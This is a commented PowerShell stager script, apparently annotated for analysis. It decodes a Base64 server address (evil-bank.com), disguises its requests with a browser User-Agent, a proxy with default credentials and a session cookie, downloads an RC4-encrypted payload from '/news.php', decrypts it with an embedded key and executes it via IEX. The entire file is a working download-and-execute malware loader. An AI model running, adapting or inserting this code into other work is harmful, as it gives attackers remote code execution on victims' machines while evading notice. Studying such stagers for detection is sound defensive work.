# Check if PowerShell version is 3 or higher
If ($PSVersionTable.PSVersion.Major -ge 3) {}

# Disable 100-Continue behavior for web requests
[System.Net.ServicePointManager]::Expect100Continue = 0

# Create a new WebClient object
$wc = New-Object System.Net.WebClient

# Define a User-Agent string
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'

# Decode a Base64-encoded server address
$ser = [Text.Encoding]::Unicode.GetString(
    [Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBlAHYAaQBsAC0AYgBhAG4AawAuAGMAbwBtADoAOAAwAA==')
)

# Define the endpoint path
$t = '/news.php'

# Set request headers
$wc.Headers.Add('User-Agent', $u)

# Configure proxy settings
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$Script:Proxy = $wc.Proxy

# Define RC4 encryption key
$K = [System.Text.Encoding]::ASCII.GetBytes('LQTQSIUCxVTfhr6GiHjD07xmGUzKdcs0')

# RC4 decryption function
$R = {
    $D, $K = $Args
    $S = 0..255
    0..255 | % {
        $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256
        $S[$_], $S[$J] = $S[$J], $S[$_]
    }
    $D | % {
        $I = ($I + 1) % 256
        $H = ($H + $S[$I]) % 256
        $S[$I], $S[$H] = $S[$H], $S[$I]
        $_ -bxor $S[($S[$I] + $S[$H]) % 256]
    }
}

# Add a custom cookie to request headers
$wc.Headers.Add("Cookie", "htsMLiAJXQn=iVlz6W4r0aVcyPXFa0h2EynuQbA=")

# Download data from the server
$data = $wc.DownloadData($ser + $t)

# Extract initialization vector (IV) from data
$iv = $data[0..3]
$data = $data[4..$data.length]

# Decrypt data and execute it
-join [Char[]](& $R $data ($IV + $K)) | IEX
